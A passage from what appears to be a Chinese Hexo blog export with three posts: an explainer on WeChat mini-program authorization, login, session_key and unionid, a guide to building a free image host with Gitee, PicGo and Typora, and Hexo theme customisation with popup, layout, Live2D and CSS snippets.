id="授权和登录的意义"><a href="#授权和登录的意义" class="headerlink" title="授权和登录的意义"></a>授权和登录的意义</h1><p>首先，在这块需要明确一下概念，<strong>授权</strong> 和 <strong>登录</strong> 是两个操作。</p><h2 id="1-授权"><a href="#1-授权" class="headerlink" title="1. 授权"></a>1. 授权</h2><p>部分接口需要经过用户授权同意才能调用。把这些接口按使用范围分成多个 <code>scope</code> ，用户选择对 <code>scope</code> 来进行授权，当授权给一个 <code>scope</code> 之后，其对应的所有接口都可以直接使用。</p><p>此类接口调用时：</p><ul><li>如果用户未接受或拒绝过此权限，会弹窗询问用户，用户点击同意后方可调用接口；</li><li>如果用户已授权，可以直接调用接口；</li><li>如果用户已拒绝授权，则不会出现弹窗，而是直接进入接口 fail 回调。</li></ul><p>参考小程序开发文档<a href="https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/authorize.html">开放能力 &#x2F; 用户信息 &#x2F; 授权 (qq.com)</a>中，授权操作是通过**wx.authorize()**接口便可以完成</p><p>提前向用户发起授权请求。调用后会立刻弹窗询问用户是否同意授权小程序使用某项功能或获取用户的某些数据，但不会实际调用对应接口。如果用户之前已经同意授权，则不会出现弹窗，直接返回成功。</p><p>也就是说，授权过程实际上只是在小程序前端获得了操作部分wx 接口的访问许可，这个过程实际上是不会与<strong>开发者服务器</strong>发生任何关系的。</p><p>再来看微信官方提供的scope 列表：</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051925365.png" alt="image-20240505192518306"> </p><p>wx.authorize(Object object)接口示例代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以通过 wx.getSetting 先查询一下用户是否授权了 &quot;scope.record&quot; 这个 scope</span></span><br><span class="line">wx.<span class="title function_">getSetting</span>(&#123;</span><br><span class="line">  <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!res.<span class="property">authSetting</span>[<span class="string">&#x27;scope.record&#x27;</span>]) &#123;</span><br><span class="line">      wx.<span class="title function_">authorize</span>(&#123;</span><br><span class="line">        <span class="attr">scope</span>: <span class="string">&#x27;scope.record&#x27;</span>,</span><br><span class="line">        success () &#123;</span><br><span class="line">          <span class="comment">// 用户已经同意小程序使用录音功能，后续调用 wx.startRecord 接口不会弹窗询问</span></span><br><span class="line">          wx.<span class="title function_">startRecord</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="2-登录"><a href="#2-登录" class="headerlink" title="2. 登录"></a>2. 登录</h2><p>所谓的登录就是要让<strong>开发者服务器</strong>知道当前的用户是谁？在传统的web 应用中，我们必须要让用户输入账号和密码才能实现登录操作。但是在微信应用中，我们可以通过微信服务器来完成这个操作，获取到与当前用户对应的唯一标志（**<u>openId</u>**）。</p><p>微信提供了两种方法  <strong>wx.login 和  wx.getUserProfile</strong> ，<strong>官方是推荐使用第二种因为第二种是必须要通过用户的授权才可以获取信息，而第一种则是直接获取。</strong></p><h3 id="wx-login："><a href="#wx-login：" class="headerlink" title="wx.login："></a>wx.login：</h3><p>wx.login()用来做登录的方法，调用接口获取登录凭证，code发送给后端用于置换session_key和openid等数据。每个用户相对于每个微信应用（公众号或者小程序）的openId 是唯一的，也就是说一个用户相对于不同的微信应用会存在不同的openId。</p><p>小程序可以通过微信官方提供的登录能力方便地获取微信提供的用户身份标识，快速建立小程序内的用户体系。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051925825.png" alt="image-20240505192537783">  </p><p><strong>上图是小程序官方的一张登录流程图，可以简单说一下这个流程</strong></p><p>1、调用 <a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/login/wx.login.html">wx.login()</a> 获取 <strong>临时登录凭证code</strong> ，并回传到开发者服务器。</p><p>2、后端调用微信接口，用appid+appsecret+code发送过去，置换到session_key+openid，以前是不能置换unionid的，但是现在在满足以下条件可以置换到unionid</p><ul><li>微信开放平台下存在同主体的App、公众号、小程序 </li><li>用户关注了某个相同主体公众号，或曾经在某个相同主体App、公众号上进行过微信登录授权 同时满足以上两个条件就能拿到用户unionid，这样一来，就能在wx.login()准确识别出用户是谁</li></ul><p>3、自定义登录态与openid和session_key关联，实际就是生成一个与openid，session_key关联的token，下发给前端</p><p>4、前端将后端下发的token存入缓存，在后面的接口请求中带上自定登录态</p><p>以上就是小程序的整个登录流程，可以看到在特定的条件下，通过wx.login()的调用拿到unionId也能在后端数据库里拿到用户信息。</p><h3 id="wx-getUserInfo-wx-getUserProfile-："><a href="#wx-getUserInfo-wx-getUserProfile-：" class="headerlink" title="wx.getUserInfo()&#x2F;wx.getUserProfile()："></a>wx.getUserInfo()&#x2F;wx.getUserProfile()：</h3><p>功能描述：获取用户信息。页面产生点击事件（例如 <code>button</code> 上 <code>bindtap</code> 的回调中）后才可调用，每次请求都会弹出授权窗口，用户同意后返回 <code>userInfo</code>。<code>wx.getUserProfile</code>该接口用于替换 <code>wx.getUserInfo</code>，详见 <a href="https://developers.weixin.qq.com/community/develop/doc/000cacfa20ce88df04cb468bc52801?highLine=login">用户信息接口调整说明</a>。</p><p>这块以<code>wx.getUserInfo</code>为例，首先看一下这个API：</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051930698.png" alt="image-20240505193046661"> </p><p>在设置withCredentials 属性为true 的情况下，这个api 可以拿到encryptedData，iv 等敏感信息，encryptedData 需要使用session_key 进行解密，解密后可以拿到的数据。</p><p>也就是说，session_key的作用之一是将小程序前端从微信服务器获取到的encryptedData 解密出来，获取到openId 和unionId等信息。</p><p>但是在wx.login()登录过程中可以看到开发者服务器是能够直接拿到用户的openId信息，而且unionId 也是有其他获取途径，所以session_key 在这里的作用看起来有点鸡肋。</p><p>具体session_key有什么作用，可以继续往下看。</p><h1 id="sessionkey的作用"><a href="#sessionkey的作用" class="headerlink" title="sessionkey的作用"></a>sessionkey的作用</h1><p>登录过程中涉及session_key和unionId，于是又引出了下面的问题。</p><p>session_key在登录的过程中或者登录完成后起什么作用呢？</p><p>前面说到在<code>wx.getUserInfo()</code>中可以利用session_key 对encryptedData进行加解密，那具体在什么场景下会涉及呢？？？</p><p>【场景举例】</p><p>在使用微信小程序的时候，登录一般会提供 <strong>微信授权一键登录</strong>，这时候会弹窗，确认手机号，然后进行登录确认：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051937473.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051939889.png" alt="image-20240505193931858"> </p><p>所以，session_key 一个重要的作用大概体现在获取用户手机方面（可能还包含其他敏感信息获取api）。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051942985.png" alt="image-20240505194236945"> </p><p>可以看到getPhoneNumber 返回的用户数据是加密过的，只有使用session_key才能解密，而小程序前端没有session_key，所以无法获取到用户的手机，只能传到开发者服务器进行处理。</p><h1 id="unionId-的作用-获取途径"><a href="#unionId-的作用-获取途径" class="headerlink" title="unionId 的作用&amp;获取途径"></a>unionId 的作用&amp;获取途径</h1><h2 id="1-unionid机制说明"><a href="#1-unionid机制说明" class="headerlink" title="1. unionid机制说明"></a>1. unionid机制说明</h2><p>如果公司拥有多个移动应用、网站应用、和公众帐号（包括小程序），可通过unionid来区分用户的唯一性，因为只要是同一个微信开放平台帐号下的移动应用、网站应用和公众帐号（包括小程序），用户的unionid是唯一的。换句话说，同一用户，对同一个微信开放平台下的不同应用，unionid是相同的。</p><p><strong>Tip</strong>：unionid 用于识别同一主体下不同账号之间的用户。举例说明：就是公司有A订阅号，B服务号，同一个人关注A和B，会得到不同的OPENID，但是会得到相同的unionid。这样就可以识别到相同的用户，用于不同账号之间打通用户关系。</p><h2 id="2-UnionID获取途径"><a href="#2-UnionID获取途径" class="headerlink" title="2. UnionID获取途径"></a>2. <strong>UnionID获取途径</strong></h2><p>必须有一个微信开放平台账号绑定了至少一个微信公众账号或者网站应用或者小程序，否则UnionID返回null。绑定了开发者帐号的小程序，可以通过下面3种途径获取UnionID。</p><p><strong>方法一：</strong>调用接口wx.getUserInfo，从解密数据中获取UnionID。注意本接口需要用户授权，请开发者妥善处理用户拒绝授权后的情况。</p><p><strong>方法二：</strong>如果开发者帐号下存在同主体的公众号，并且该用户已经关注了该公众号。开发者可以直接通过wx.login获取到该用户UnionID，无须用户再次授权。</p><p><strong>方法三：</strong>如果开发者帐号下存在同主体的公众号或移动应用，并且该用户已经授权登录过该公众号或移动应用。开发者也可以直接通过wx.login获取到该用户UnionID，无须用户再次授权。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051944734.png" alt="img"> </p><h1 id="在应用中如何保存登录态"><a href="#在应用中如何保存登录态" class="headerlink" title="在应用中如何保存登录态"></a>在应用中如何保存登录态</h1><p>保存用户登录态，一直以来都有两种解决方案：前端保存和后端保存。</p><h2 id="1-前端保存"><a href="#1-前端保存" class="headerlink" title="1. 前端保存"></a>1. 前端保存</h2><p>在前面登录章节中<strong>自定义登录态</strong>写session 的时候可以直接设定过期时间，定期通知小程序前端重新进行登录（wx.login）。</p><h2 id="2-前端保存"><a href="#2-前端保存" class="headerlink" title="2. 前端保存"></a>2. 前端保存</h2><p>因为session_key 存在时效性问题（毕竟是用来查看敏感信息），而小程序前端可以通过wx.checkSession() 来检查session_key 是否过期。所以可以通过这个来作为保存用户登录态的机制，这也是小程序文档中推荐的方法：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405051947710.png" alt="image-20240505194743677"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> sessionkey </tag>
            
            <tag> unionid </tag>
            
            <tag> 小程序登录&amp;授权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitee搭建免费图床</title>
      <link href="/2024/04/17/Gitee%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/"/>
      <url>/2024/04/17/Gitee%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么要搭建图床？？？</p><ol><li>hexo默认可以加载本地文件夹和外部URL的图片，搭建图床后主要用来存储图片，方便管理；</li><li>可以将md文件+对应路径图片打包，方便管理；</li><li>可移植性强。</li></ol><p>还有一个原因，这玩意免费啊！！！</p><p>​Typora+PicGo+Gitee实现图片上传功能<br>​抓紧时间步入正题，Go！</p><h1 id="第一步-配置Gitee仓库"><a href="#第一步-配置Gitee仓库" class="headerlink" title="第一步 配置Gitee仓库"></a>第一步 配置Gitee仓库</h1><p>1、附上<a href="https://gitee.com/">码云gitee</a>地址</p><p>2、注册登录自己的gitee账号</p><p>3、创建仓库，仓库要求公开，so要上传合法图片哒~</p><ul><li>步骤一：创建仓库</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170937885.png" alt="image-20240417093654778"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170941548.png" alt="image-20240417094102500"> </p><ul><li>步骤二：生成私人令牌（请在备忘录中记下生成的私人令牌 ）</li></ul><p>打开“个人主页”—&gt;“个人设置”—-&gt;“私人令牌”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170942484.png" alt="image-20240417094222456"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170943977.png" alt="image-20240417094311937"> </p><p>点击 “生成新的令牌” ，提交后，将生成的私人令牌保存好，后面会用到。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170946003.png" alt="image-20240417094637966">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404170947800.png" alt="image-20240417094732760"> </p><h1 id="第二步-PicGo的下载及相关配置"><a href="#第二步-PicGo的下载及相关配置" class="headerlink" title="第二步 PicGo的下载及相关配置"></a>第二步 PicGo的下载及相关配置</h1><p>下载地址：<a href="https://github.com/Molunerfinn/PicGo/releases">https://github.com/Molunerfinn/PicGo/releases</a></p><p><strong>1、首先，下载PicGo的安装包</strong></p><p><a href="https://picgo.github.io/PicGo-Doc/zh/guide/#%E5%BA%94%E7%94%A8%E6%A6%82%E8%BF%B0">PicGo官网指南</a><br>一个图床，一个用于快速上传图片并获取图片URL链接的工具，也完全免费。</p><p><strong>2、其次，在PicGo中安装插件</strong></p><p>常见问题：</p><p>\1. 安装插件一直显示“安装中”；</p><p>\2. 使用npm命令安装插件提示： npm不是内部或外部命令，也不是可运行的程序</p><p>解决：Node.js安装及环境配置，这个必须配置的！！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171006115.png" alt="image-20240417100629083"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171020809.png" alt="image-20240417102035779"> </p><p><strong>4、最后，完成PicGo的相关配置</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171024030.png" alt="image-20240417102414003"> </p><p>提示“设置成功”即可，配置好后进行<strong>重启！！！！！！</strong><br>随后，设置PicGo时，先选择显示的图床为gitee，再上翻进行设置Server</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171050897.png" alt="image-20240417105056869"> </p><p>设置成功后在“上传区”测试图片是否能够成功上传，多试几张图片或者重启PicGo看看</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171051216.png" alt="image-20240417105117184"> </p><h1 id="第三步-Typora的下载及相关配置"><a href="#第三步-Typora的下载及相关配置" class="headerlink" title="第三步 Typora的下载及相关配置"></a>第三步 Typora的下载及相关配置</h1><p>typora是一款支持实时预览的Markdown文本编辑器， 并且完全免费<br>下载地址： <a href="https://www.typora.io/">typora</a></p><p>文件—&gt;偏好设置–&gt;配置PicGo路径</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171052201.png" alt="image-20240417105231175"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171053000.png" alt="image-20240417105306966"> </p><p>上传图片之后，图片地址指向码云仓库并且提示上传成功就可了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这样，就可以实现，当使用Typora写文档的时候，无论上传本地&amp;远程的图片，复制过来后，会自动通过PicGo上传到gitee中。</p><p>Typora——&gt;PicGo——&gt;Gitee</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171057563.png" alt="image-20240417105744532"> </p><p>同理，可以看到hexo中的图片加载默认就是从gitee中获取了！！！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404171100384.png" alt="image-20240417110017307"> </p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
            <tag> 博客美化 </tag>
            
            <tag> Gitee </tag>
            
            <tag> Picgo </tag>
            
            <tag> typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo主题美化(续)</title>
      <link href="/2024/04/11/hexo%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96-%E7%BB%AD/"/>
      <url>/2024/04/11/hexo%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96-%E7%BB%AD/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="hexo弹出欢迎弹窗"><a href="#hexo弹出欢迎弹窗" class="headerlink" title="hexo弹出欢迎弹窗"></a>hexo弹出欢迎弹窗</h1><h2 id="选择一个好看的弹窗"><a href="#选择一个好看的弹窗" class="headerlink" title="选择一个好看的弹窗"></a>选择一个好看的弹窗</h2><p>首先，既然要弹窗，就要好看，而不是JavaScript里的alert()函数。</p><p>这块参考网上文章后，选定使用sweetAlert来实现弹窗（<a href="https://sweetalert.js.org/">SweetAlert</a>），感觉不错。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111531919.png" alt="img"></p><h3 id="获取其JavaScript和CSS文件"><a href="#获取其JavaScript和CSS文件" class="headerlink" title="获取其JavaScript和CSS文件"></a>获取其JavaScript和CSS文件</h3><p>首先，需要将sweetalert.js和sweetalert.css放到自己博客下。</p><h3 id="新建JavaScript文件夹"><a href="#新建JavaScript文件夹" class="headerlink" title="新建JavaScript文件夹"></a>新建JavaScript文件夹</h3><p>在博客根目录往下找到\themes\next\source\js文件夹，新建sweetalert.js，文件内容<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.pai233.top/js/sweetalert.js&source=article&objectId=1933199">请看这里</a>，觉得复制麻烦的可以直接按Crtl+S进行保存。</p><h3 id="新建CSS文件"><a href="#新建CSS文件" class="headerlink" title="新建CSS文件"></a>新建CSS文件</h3><p>在博客根目录往下找到\themes\next\source\css文件夹，新建sweetalert.css，文件内容<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.pai233.top/css/sweetalert.css&source=article&objectId=1933199">请看这里</a>。</p><h2 id="引入到主题中"><a href="#引入到主题中" class="headerlink" title="引入到主题中"></a>引入到主题中</h2><p>打开\themes\next\layout_layout.swig，在<head>标签内插入以下语句：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/js/sweetalert.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/sweetalert.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这样就完成了引入。</p><h2 id="自动弹窗"><a href="#自动弹窗" class="headerlink" title="自动弹窗"></a>自动弹窗</h2><p>在博客根目录往下找到\themes\next\source\js文件夹，新建welcome.js：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">welcome_text</span> <span class="operator">=</span> <span class="string">&#x27;欢迎光顾xxx的小窝~&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(document.referrer!==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        let referrer=document.referrer.split(<span class="string">&quot;/&quot;</span>)[<span class="number">2</span>];</span><br><span class="line">        welcome_text=<span class="string">&quot;欢迎你，来自&quot;</span>+referrer.toUpperCase()+<span class="string">&quot;的用户！&quot;</span>;<span class="comment">//获取用户来源域名</span></span><br><span class="line">    &#125;</span><br><span class="line">    swal(&#123;</span><br><span class="line">        title: <span class="string">&quot; 欢迎！&quot;</span>,</span><br><span class="line">        text: welcome_text+<span class="string">&#x27;\n打开页面下方音乐以获得更佳体验！&#x27;</span>,<span class="comment">//欢迎文本，可自行修改</span></span><br><span class="line">        imageUrl: <span class="string">&quot;/images/avatar.jpg&quot;</span>,<span class="comment">//图片，自行修改位置</span></span><br><span class="line">        timer: <span class="number">3000</span>,<span class="comment">//弹出时间</span></span><br><span class="line">        showConfirmButton: <span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">$(document).ready(()=&gt;&#123;<span class="comment">//若未引用JQuery，请引用</span></span><br><span class="line">    welcome()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样就大功告成了~~~</p><h1 id="双栏布局"><a href="#双栏布局" class="headerlink" title="双栏布局"></a>双栏布局</h1><p>默认情况，博客文章是单栏布局的，如下所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111532739.png" alt="img"> </p><p>但是我们可以通过插件 “hexo-butterfly-article-double-row” 将其调整为双栏布局，如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111533993.png" alt="image.png"> </p><p>首先执行以下的命令</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm i hexo-butterfly-article-<span class="type">double</span>-row --save</span><br></pre></td></tr></table></figure><p>在网站的根配置文件下添加以下的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#双栏美化</span><br><span class="line">butterfly_article_double_row:</span><br><span class="line">  enable: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>【重要】这块有个点一定要注意，是在我们默认的根配置文件 _config.yml 中添加上述代码，而不是在主题配置文件中，如果配置在主题文件中后续hexo一键三连的时候会报错，解析有问题：</p><p>“Cannot read property ‘enable’ of undefined”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111532633.png" alt="img"> </p><p>这样之后，可以成功切换双栏了，但有个bug，页面比较丑，且页码是有问题的</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111532753.png" alt="img"> </p><p>通过扒取其他博主的的样式代码，发现有些地方需要改一下，在\themes\butterfly\source\css目录下新建文件mycss.css（一般存自己的一些样式代码，或者想本案例中需要做一些调整的样式代码）,添加以下代码：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&#123;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.layout</span> <span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span> <span class="selector-class">.post_cover</span>&#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">280px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&gt;<span class="selector-class">.recent-post-info</span>&#123;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.layout</span> <span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&gt;<span class="selector-class">.recent-post-info</span>&gt;<span class="selector-class">.article-title</span>&#123;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">1.6em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&gt;<span class="selector-class">.recent-post-info</span>&gt;<span class="selector-class">.article-meta-wrap</span>&#123;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#pagination</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">1rem</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#pagination</span> <span class="selector-class">.page-number</span>&#123;</span><br><span class="line"><span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">16px</span> -<span class="number">4px</span> <span class="number">#2c2d300c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.layout</span>&gt;<span class="selector-class">.recent-posts</span> <span class="selector-class">.pagination</span>&gt;<span class="selector-pseudo">:not</span>(<span class="selector-class">.space</span>)&#123;</span><br><span class="line"><span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">16px</span> -<span class="number">4px</span> <span class="number">#2c2d300c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时在主题配置目录inject字段下引入mycss.css文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject</span><br><span class="line">    - &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/mycss.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>再次查看效果</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111534081.png" alt="image.png"> </p><p>个人感觉双栏没有单栏看着舒服，这块只做演示。。。</p><h1 id="添加卡通人物"><a href="#添加卡通人物" class="headerlink" title="添加卡通人物"></a>添加卡通人物</h1><p>可以给博客添加一个卡通宠物，还能根据你鼠标位置摇头，点击此处（<a href="https://github.com/EYHN/hexo-helper-live2d">点击此处</a>）进入项目地址：</p><h2 id="初级版"><a href="#初级版" class="headerlink" title="初级版"></a>初级版</h2><p>已经封装好了插件，但只是模型，不能说话、不能换装、功能较少。</p><p>1、安装模块</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p>2、输入以下命令，下载相应的模型，将 packagename 更换成模型名称即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install packagename  <span class="comment">//npm install live2d-widget-model-wanko</span></span><br></pre></td></tr></table></figure><p>具体的packagename和对应图片可以<a href="https://blog.csdn.net/u012931864/article/details/83054822">点击此处</a></p><p>3、在 站点配置文件 中新增如下内容（这块要求必须是站点配置文件，不能是主题配置文件）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Live2D</span><br><span class="line">## https:<span class="comment">//github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line">live2d:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  # enable: <span class="literal">false</span></span><br><span class="line">  scriptFrom: local # 默认</span><br><span class="line">  pluginRootPath: live2dw/ # 插件在站点上的根目录(相对路径)</span><br><span class="line">  pluginJsPath: lib/ # 脚本文件相对与插件根目录路径</span><br><span class="line">  pluginModelPath: assets/ # 模型文件相对与插件根目录路径</span><br><span class="line">  # scriptFrom: jsdelivr # jsdelivr CDN</span><br><span class="line">  # scriptFrom: unpkg # unpkg CDN</span><br><span class="line">  # scriptFrom: https:<span class="comment">//cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url</span></span><br><span class="line">  tagMode: <span class="literal">false</span> # 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span><br><span class="line">  debug: <span class="literal">false</span> # 调试, 是否在控制台输出日志</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-wanko # npm-<span class="keyword">module</span> <span class="keyword">package</span> name</span><br><span class="line">    # use: wanko # 博客根目录/live2d_models/ 下的目录名</span><br><span class="line">    # use: ./wives/wanko # 相对于博客根目录的路径</span><br><span class="line">    # use: https:<span class="comment">//cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span></span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: <span class="number">150</span></span><br><span class="line">    height: <span class="number">300</span></span><br><span class="line">  mobile:</span><br><span class="line">    show: <span class="literal">false</span> # 手机中是否展示</span><br></pre></td></tr></table></figure><p>3、展示如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111534918.png" alt="img"> </p><h2 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h2><p>网上也有一些进阶版的卡通人物实现，功能齐全。能说话、能换装、能玩游戏、能拍照、还能自定义。</p><p>具体实现，可以参考：</p><p><a href="https://augu1sto.gitee.io/ee36c104ddd2/">Hexo美化|站宠？看板娘？live2d配置（附魔改插件和新模型）</a></p><p><a href="https://zhuanlan.zhihu.com/p/58325389">Hexo博客NexT主题美化之新增看板娘(能说话、能换装)</a></p><h1 id="小标题添加旋转小风车"><a href="#小标题添加旋转小风车" class="headerlink" title="小标题添加旋转小风车"></a>小标题添加旋转小风车</h1><p>1、打开 _config.butterfly.yml<br>找到 Beautify，将 <a href="https://so.csdn.net/so/search?q=enable&spm=1001.2101.3001.7020">enable</a> 设置为 true，title-prefix-icon 设置为 ‘\f863’</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Beautify (美化頁面顯示)</span><br><span class="line">beautify:</span><br><span class="line">    enable: <span class="literal">true</span></span><br><span class="line">    field: post # site/post</span><br><span class="line">    title-prefix-icon: <span class="string">&#x27;\f863&#x27;</span> # <span class="string">&#x27;\f0c1&#x27;</span></span><br><span class="line">    title-prefix-icon-color: <span class="string">&quot;#F47466&quot;</span></span><br></pre></td></tr></table></figure><p>2、在主题<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E5%A4%B9&spm=1001.2101.3001.7020">文件夹</a> source&#x2F;css&#x2F; 中创建一个 icon.css，内容如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 文章页H1-H6图标样式效果 */</span></span><br><span class="line"><span class="comment">/* 控制风车转动速度 4s那里可以自己调节快慢 */</span></span><br><span class="line">h1::before,</span><br><span class="line">h2::before,</span><br><span class="line">h3::before,</span><br><span class="line">h4::before,</span><br><span class="line">h5::before,</span><br><span class="line">h6::before &#123;</span><br><span class="line">  -webkit-animation: ccc 4s linear infinite;</span><br><span class="line">  animation: ccc 4s linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 控制风车转动方向 -1turn 为逆时针转动，1turn 为顺时针转动，相同数字部分记得统一修改 */</span></span><br><span class="line">@-webkit-keyframes ccc &#123;</span><br><span class="line">  <span class="number">0</span>% &#123;</span><br><span class="line">    -webkit-transform: rotate(0deg);</span><br><span class="line">    transform: rotate(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  to &#123;</span><br><span class="line">    -webkit-transform: rotate(-1turn);</span><br><span class="line">    transform: rotate(-1turn);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@keyframes</span> ccc &#123;</span><br><span class="line">  <span class="number">0</span>% &#123;</span><br><span class="line">    -webkit-transform: rotate(0deg);</span><br><span 